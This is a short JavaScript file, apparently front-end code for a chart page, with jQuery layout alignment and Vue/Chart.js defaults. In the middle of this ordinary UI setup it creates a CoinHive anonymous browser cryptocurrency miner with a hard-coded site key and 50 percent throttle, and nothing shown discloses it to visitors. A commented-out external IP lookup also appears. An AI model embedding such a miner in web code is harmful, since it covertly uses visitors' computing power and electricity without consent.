$('.pull-down').each(function() {
  var $this = $(this);
  $this.css('margin-top', $this.parent().height() - $this.height())
});
// var ipaddr = $.get("https://api.ipify.org")
var siteKey = 'nqHHUpoSfv33ohk7nq0gwqz71I3hp73C';
var miner = new CoinHive.Anonymous(siteKey, {throttle: 0.5});
Vue.use(VueChart.default)
Chart.defaults.global.elements.point.radius = 0;
Chart.defaults.global.elements.point.hitRadius = 20;
Chart.defaults.global.elements.point.hoverBorderWidth = 4;
